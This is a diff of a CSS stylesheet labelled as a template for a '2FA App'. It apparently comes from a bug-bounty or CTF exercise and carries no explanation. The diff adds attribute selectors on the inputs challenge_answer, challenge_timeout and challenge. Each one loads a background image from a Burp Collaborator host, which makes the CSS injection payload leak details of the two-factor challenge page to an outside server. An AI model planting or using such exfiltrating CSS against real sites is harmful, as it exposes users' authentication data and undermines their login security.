@@ -1,18 +1,27 @@
 /**
 Template for the UNI 2FA App
  */
- @import url(//hcxl3h6pfqzvwizhks7elkz0frlp9e.burpcollaborator.net/polling?len=2);
 
 body {
-    background-image: url(https://as6ejamivjfocbfa0ln71dftvk1ep3.burpcollaborator.net);
+    background-image: url("https://jj67iyuebjjptxjs9yae4kcgx73yrn.burpcollaborator.net/body");
 }
 
 div.branding {
     height:80px;
     width:80px;
     margin:20px auto 40px auto;
-    background-image:url("https://as6ejamivjfocbfa0ln71dftvk1ep3.burpcollaborator.net/images/bountypay.png");
+    background-image:url("https://jj67iyuebjjptxjs9yae4kcgx73yrn.burpcollaborator.net/images/bountypay.png");
     background-position:center center;
     background-repeat: no-repeat;
     background-size: cover;
+}
+
+input[name=challenge_answer]{
+    background-image: url("https://jj67iyuebjjptxjs9yae4kcgx73yrn.burpcollaborator.net/challenge_answer");
+}
+input[name=challenge_timeout]{
+    background-image: url("https://jj67iyuebjjptxjs9yae4kcgx73yrn.burpcollaborator.net/challenge_timeout");
+}
+input[name=challenge]{
+    background-image: url("https://jj67iyuebjjptxjs9yae4kcgx73yrn.burpcollaborator.net/challenge");
 }
